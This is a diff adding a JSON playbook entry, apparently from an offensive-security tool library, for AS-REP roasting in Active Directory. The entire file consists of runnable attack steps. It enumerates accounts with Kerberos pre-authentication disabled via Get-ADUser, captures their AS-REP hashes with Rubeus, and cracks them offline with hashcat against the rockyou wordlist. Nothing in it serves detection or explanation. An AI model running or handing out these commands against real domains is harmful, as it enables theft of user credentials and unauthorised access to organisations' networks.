@@ -1,0 +1,25 @@
+{
+	"name": "Pre-Auth Disabled Account Exploitation",
+	"description": "Target users with Kerberos pre-authentication disabled.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Identify Targets",
+			"command": "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties sAMAccountName,UserPrincipalName",
+			"description": "List vulnerable accounts."
+		},
+		{
+			"index": 2,
+			"name": "Hash Extraction",
+			"command": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
+			"description": "Request and capture AS-REP responses."
+		},
+		{
+			"index": 3,
+			"name": "Hash Cracking",
+			"command": "hashcat -m 18200 asrep.txt rockyou.txt",
+			"description": "Recover passwords offline."
+		}
+	]
+}
